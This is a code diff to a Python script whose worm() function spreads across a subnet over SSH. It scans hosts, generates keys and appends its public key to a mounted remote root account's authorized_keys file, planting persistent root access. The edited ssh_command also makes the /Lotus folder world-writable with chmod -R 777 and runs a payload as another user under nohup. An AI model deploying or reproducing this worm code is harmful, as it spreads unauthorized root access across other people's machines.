@@ -7,7 +7,7 @@ import base64
 from os import path
 import time
 import getpass
-ssh_command = "/Lotus/Lotus.py; su joe -c 'export DISPLAY=:0; /Lotus/bluewin.py'; exit; exit"                                             
+ssh_command = "/Lotus/Lotus.py; chmod -R 777 /Lotus; su administrator -c 'export DISPLAY=:0; nohup /Lotus/bluewin.py'; exit; exit"
 
 def subnet():                                                                     
     global h_ip                                                                   
@@ -59,7 +59,6 @@ def worm():
             subprocess.run(['ssh-keyscan ' + str(ip) + '>> ~/.ssh/known_hosts'], shell=True)
             proc = subprocess.Popen(['ssh-keygen -t rsa -f ~/.ssh/id_rsa'],stdout=PIPE, stdin=PIPE, shell=True)
             proc.communicate(input=base64.encodebytes('y'.encode()))
-            proc.communicate()
             subprocess.call(['cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys'], shell=True)
             time.sleep(5)
             subprocess.run(['umount /tmp/r00t'], shell=True)
